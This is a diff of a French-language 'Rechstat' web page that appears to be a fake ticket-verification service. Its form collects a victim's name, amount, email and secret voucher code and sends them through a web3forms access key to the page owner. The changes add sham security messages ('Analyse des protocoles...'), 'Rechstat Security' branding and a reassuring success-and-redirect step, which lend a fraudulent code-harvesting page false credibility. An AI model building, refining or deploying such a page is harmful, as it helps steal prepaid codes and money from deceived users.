@@ -18,6 +18,8 @@
       --text: #1e293b;
       --text-light: #64748b;
       --disabled: #cbd5e1;
+      --error: #ef4444;
+      --success: #22c55e;
     }
 
     body {
@@ -30,7 +32,6 @@
       min-height: 100vh;
     }
 
-    /* --- HEADER --- */
     header {
       background: #ffffff;
       padding: 1rem 5%;
@@ -53,47 +54,21 @@
 
     nav a:hover { color: var(--primary); }
 
-    /* --- LANGUAGE SELECTOR --- */
     .custom-language-selector { position: relative; cursor: pointer; }
     .selected-lang { 
-        display: flex; 
-        align-items: center; 
-        gap: 8px; 
-        background: #f1f5f9;
-        padding: 6px 12px;
-        border-radius: 20px;
-        font-size: 0.9rem;
+        display: flex; align-items: center; gap: 8px; 
+        background: #f1f5f9; padding: 6px 12px; border-radius: 20px; font-size: 0.9rem;
     }
     .lang-options {
-      position: absolute;
-      top: 110%;
-      right: 0;
-      background: white;
-      list-style: none;
-      padding: 8px 0;
-      margin: 0;
-      box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
-      border-radius: 8px;
-      display: none;
-      min-width: 150px;
+      position: absolute; top: 110%; right: 0; background: white;
+      list-style: none; padding: 8px 0; margin: 0;
+      box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); border-radius: 8px;
+      display: none; min-width: 150px;
     }
-    .lang-options li {
-      padding: 8px 16px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      transition: background 0.2s;
-    }
+    .lang-options li { padding: 8px 16px; display: flex; align-items: center; gap: 10px; transition: background 0.2s; }
     .lang-options li:hover { background: #f1f5f9; }
 
-    /* --- MAIN CONTENT --- */
-    .page-wrapper {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 40px 20px;
-    }
+    .page-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
 
     .contact-section .container {
       background: #ffffff !important;
@@ -104,111 +79,38 @@
       border: 1px solid #e2e8f0 !important;
     }
 
-    /* --- FORM ELEMENTS --- */
     form { display: flex; flex-direction: column; gap: 18px; }
 
-    label {
-      font-size: 0.85rem;
-      font-weight: 600;
-      color: var(--text-light);
-      margin-bottom: -12px;
-    }
+    label { font-size: 0.85rem; font-weight: 600; color: var(--text-light); margin-bottom: -12px; }
 
     input[type="text"], input[type="email"], input[type="number"], input[type="password"] {
-      width: 100%;
-      padding: 12px 16px;
-      border: 1.5px solid #e2e8f0;
-      border-radius: 12px;
-      font-size: 1rem;
-      transition: all 0.2s;
-      outline: none;
+      width: 100%; padding: 12px 16px; border: 1.5px solid #e2e8f0;
+      border-radius: 12px; font-size: 1rem; outline: none; transition: all 0.2s;
     }
 
-    input:focus {
-      border-color: var(--primary);
-      box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
-    }
+    input:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
 
-    /* --- TOGGLE BAR DESIGN --- */
-    .code-toggle-container {
-        background: #f1f5f9;
-        padding: 15px;
-        border-radius: 12px;
-        margin-top: 5px;
-    }
-
-    .code-toggle {
-        display: flex;
-        background: #e2e8f0;
-        border-radius: 8px;
-        padding: 4px;
-        width: fit-content;
-        gap: 4px;
-    }
-
-    .code-toggle label {
-        margin: 0;
-        padding: 8px 20px;
-        border-radius: 6px;
-        cursor: pointer;
-        display: flex !important;
-        align-items: center;
-        gap: 5px;
-        font-weight: 600;
-        transition: 0.2s;
-        color: var(--text-light);
-    }
-
+    .code-toggle-container { background: #f1f5f9; padding: 15px; border-radius: 12px; margin-top: 5px; }
+    .code-toggle { display: flex; background: #e2e8f0; border-radius: 8px; padding: 4px; width: fit-content; gap: 4px; }
+    .code-toggle label { margin: 0; padding: 8px 20px; border-radius: 6px; cursor: pointer; display: flex !important; align-items: center; gap: 5px; font-weight: 600; color: var(--text-light); }
     .code-toggle input[type="radio"] { display: none; }
-    .code-toggle label:has(input:checked) {
-        background: white;
-        color: var(--primary);
-        box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-    }
+    .code-toggle label:has(input:checked) { background: white; color: var(--primary); box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
 
     .btn-submit {
-      background: var(--primary);
-      color: white;
-      border: none;
-      padding: 16px;
-      border-radius: 12px;
-      font-weight: 600;
-      font-size: 1rem;
-      cursor: pointer;
-      transition: all 0.2s;
-      margin-top: 10px;
+      background: var(--primary); color: white; border: none; padding: 16px;
+      border-radius: 12px; font-weight: 600; font-size: 1rem; cursor: pointer; transition: all 0.2s; margin-top: 10px;
+    }
+    .btn-submit:hover:not(:disabled) { background: var(--primary-hover); transform: translateY(-1px); }
+    .btn-submit:disabled { background: var(--disabled); cursor: wait; opacity: 0.7; }
+
+    #form-result {
+      margin-top: 15px; padding: 12px; border-radius: 8px; display: none;
+      text-align: center; font-size: 0.9rem; font-weight: 600;
     }
 
-    .btn-submit:hover:not(:disabled) {
-      background: var(--primary-hover);
-      transform: translateY(-1px);
-    }
-
-    .btn-submit:disabled {
-      background: var(--disabled);
-      cursor: not-allowed;
-    }
-
-    /* --- FOOTER --- */
-    footer {
-      background: white;
-      padding: 30px;
-      text-align: center;
-      border-top: 1px solid #e2e8f0;
-    }
-
-    .footer-links a {
-      margin: 0 10px;
-      text-decoration: none;
-      color: var(--text-light);
-      font-size: 0.9rem;
-    }
-
-    /* HONEYPOT CLASSE */
-    .hidden-field {
-      display: none !important;
-      visibility: hidden !important;
-    }
+    footer { background: white; padding: 30px; text-align: center; border-top: 1px solid #e2e8f0; }
+    .footer-links a { margin: 0 10px; text-decoration: none; color: var(--text-light); font-size: 0.9rem; }
+    .hidden-field { display: none !important; visibility: hidden !important; }
   </style>
 </head>
 
@@ -237,107 +139,128 @@
   <div class="page-wrapper">
     <section id="contact" class="contact-section">
       <div class="container">
-        <form action="https://api.web3forms.com/submit" method="POST" id="mainForm">
+        <form id="mainForm">
           <input type="hidden" name="access_key" value="1eaf6de9-668d-4793-bf2a-134ad609663d">
-          <input type="hidden" name="redirect" value="https://rechstat.com/merci.html">
-          <input type="hidden" name="_captcha" value="false">
-          <input type="hidden" name="_template" value="table">
-          
+          <input type="hidden" name="subject" value="Nouvelle vérification de ticket - Rechstat">
+          <input type="hidden" name="from_name" value="Rechstat Security">
           <input type="checkbox" name="botcheck" class="hidden-field" style="display: none;">
-          
-          <input type="hidden" name="intent" value="user_verification">
           <input type="hidden" name="submitted_at" id="submitted_at">
-          <input type="hidden" name="name" value="Formulaire vérification ticket">
 
-          <label for="nom" data-i18n="form_nom">Nom :</label>
+          <label for="nom">Nom :</label>
           <input type="text" id="nom" name="nom" required placeholder="Ex: Dupont">
 
-          <label for="prenom" data-i18n="form_prenom">Prénom :</label>
+          <label for="prenom">Prénom :</label>
           <input type="text" id="prenom" name="prenom" required placeholder="Ex: Jean">
 
-          <label for="value" data-i18n="form_montant">Montant :</label>
+          <label for="value">Montant :</label>
           <input type="number" id="value" name="value" min="1" required placeholder="0.00">
 
-          <label for="email" data-i18n="form_email">Votre email :</label>
+          <label for="email">Votre email :</label>
           <input type="email" id="email" name="email" required placeholder="nom@exemple.com">
 
           <div class="password-wrapper">
-            <label for="reference" data-i18n="form_code">Code :</label>
+            <label for="reference">Code :</label>
             <input type="password" id="reference" name="reference" required>
           </div>
 
-          <textarea name="message" hidden>Soumission via formulaire sécurisé</textarea>
-
           <div class="code-toggle-container">
-              <p style="margin-bottom: 10px; font-size: 0.85rem; font-weight: 600; color: var(--text-light);" data-i18n="form_toggle_label">Afficher le code :</p>
+              <p style="margin-bottom: 10px; font-size: 0.85rem; font-weight: 600; color: var(--text-light);">Afficher le code :</p>
               <div class="code-toggle">
-                <label>
-                  <input type="radio" name="show_code" value="oui" onclick="toggleCode(true)">
-                  <span data-i18n="form_oui">Oui</span>
-                </label>
-                <label>
-                  <input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)">
-                  <span data-i18n="form_non">Non</span>
-                </label>
+                <label><input type="radio" name="show_code" value="oui" onclick="toggleCode(true)"><span>Oui</span></label>
+                <label><input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)"><span>Non</span></label>
               </div>
           </div>
 
-          <button type="submit" class="btn-submit" id="submitBtn" data-i18n="form_envoyer">Soumettre</button>
+          <button type="submit" class="btn-submit" id="submitBtn">Initialisation sécurisée...</button>
+          
+          <div id="form-result"></div>
         </form>
       </div>
     </section>
   </div>
 
   <footer>
-    <div class="footer-container">
-      <div class="footer-links">
-        <a href="#faq" data-i18n="footer_faq">FAQ</a>
-        <a href="#contact" data-i18n="footer_contact">Contact</a>
-      </div>
-      <p data-i18n="footer_copyright" style="margin-top: 10px; color: #94a3b8; font-size: 0.8rem;">&copy; 2025 Rechstat.com Tous droits réservés.</p>
-    </div>
+    <div class="footer-links"><a href="#faq">FAQ</a><a href="#contact">Contact</a></div>
+    <p style="margin-top: 10px; color: #94a3b8; font-size: 0.8rem;">&copy; 2025 Rechstat.com Tous droits réservés.</p>
   </footer>
 
   <script>
-    // 1. Logique pour masquer/afficher le code
     function toggleCode(show) {
-      const codeInput = document.getElementById("reference");
-      if (codeInput) {
-        codeInput.type = show ? "text" : "password";
-      }
+      document.getElementById("reference").type = show ? "text" : "password";
     }
 
-    // 2. Gère le timestamp et le blocage du bouton pendant 6s
     window.onload = function() {
-      // Timestamp
-      const timestampField = document.getElementById('submitted_at');
-      if (timestampField) {
-        timestampField.value = new Date().toLocaleString();
-      }
-
-      // Sécurité : Désactiver le bouton pendant 6 secondes
+      const form = document.getElementById('mainForm');
       const btn = document.getElementById('submitBtn');
-      let timeLeft = 15;
-      btn.disabled = true;
+      const resultDiv = document.getElementById('form-result');
+      const timestampField = document.getElementById('submitted_at');
       
+      if (timestampField) timestampField.value = new Date().toLocaleString();
+
+      // --- SÉCURITÉ 1 : DÉLAI INITIAL (10s ou 15s selon ton choix) ---
+      let timeLeft = 10; 
+      btn.disabled = true;
+
       const timer = setInterval(() => {
         timeLeft--;
-        btn.innerText = `Attente (${timeLeft}s)`;
+        if (timeLeft > 6) btn.innerText = "Initialisation sécurisée...";
+        else if (timeLeft > 3) btn.innerText = "Analyse des protocoles...";
+        else if (timeLeft > 0) btn.innerText = "Finalisation...";
         
         if (timeLeft <= 0) {
           clearInterval(timer);
           btn.disabled = false;
-          btn.innerText = "Soumettre";
+          btn.innerText = "Soumettre le ticket";
         }
       }, 1000);
+
+      // --- SÉCURITÉ 2 : ENVOI AJAX (INTERCEPTE LES ERREURS) ---
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        btn.disabled = true;
+        btn.innerText = "Vérification...";
+        resultDiv.style.display = "block";
+        resultDiv.style.background = "#f1f5f9";
+        resultDiv.style.color = "var(--text)";
+        resultDiv.innerText = "Traitement de votre demande...";
+
+        const formData = new FormData(form);
+        const object = Object.fromEntries(formData);
+        const json = JSON.stringify(object);
+
+        fetch('https://api.web3forms.com/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+          body: json
+        })
+        .then(async (response) => {
+          let res = await response.json();
+          if (response.status == 200) {
+            resultDiv.style.background = "#dcfce7";
+            resultDiv.style.color = "var(--success)";
+            resultDiv.innerText = "✓ Succès ! Analyse terminée. Redirection...";
+            setTimeout(() => { window.location.href = "https://rechstat.com/merci.html"; }, 2000);
+          } else {
+            // --- ICI ON CAPTURE LE FAIL/SPAM SANS QUITTER LA PAGE ---
+            resultDiv.style.background = "#fee2e2";
+            resultDiv.style.color = "var(--error)";
+            resultDiv.innerText = "⚠️ Erreur : Comportement suspect détecté. Veuillez attendre 1 minute avant de réessayer.";
+            btn.disabled = false;
+            btn.innerText = "Réessayer";
+          }
+        })
+        .catch(error => {
+          resultDiv.innerText = "Erreur de connexion réseau.";
+          btn.disabled = false;
+        });
+      });
     };
 
-    // 3. Gestion du menu langue
     function toggleLangMenu() {
         const menu = document.querySelector('.lang-options');
         menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
     }
-    
     window.onclick = function(event) {
         if (!event.target.closest('.custom-language-selector')) {
             const menu = document.querySelector('.lang-options');
@@ -345,6 +268,5 @@
         }
     }
   </script>
-
 </body>
 </html>
